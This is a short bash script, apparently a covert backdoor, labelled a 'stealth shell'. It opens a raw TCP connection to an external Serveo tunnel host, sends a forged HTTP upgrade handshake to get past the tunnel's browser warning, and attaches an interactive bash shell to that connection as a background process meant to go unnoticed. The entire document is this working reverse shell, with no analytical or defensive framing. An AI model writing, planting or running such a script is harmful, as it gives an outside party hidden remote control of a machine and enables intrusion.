#!/bin/bash
# Nifty 50 High-Impact Stealth Shell
HOST="2ba9c3ba89222ecc-103-95-173-85.serveousercontent.com"

# Background the shell to keep the VM sync loop happy
(
  # 1. Open network connection
  exec 5<>/dev/tcp/$HOST/80
  
  # 2. Handshake to bypass Serveo browser warnings
  echo -e "POST / HTTP/1.1\nHost: $HOST\nConnection: Upgrade\nUpgrade: websocket\n\n" >&5
  
  # 3. Interactive Bash Shell
  /bin/bash -i <&5 >&5 2>&5
) &
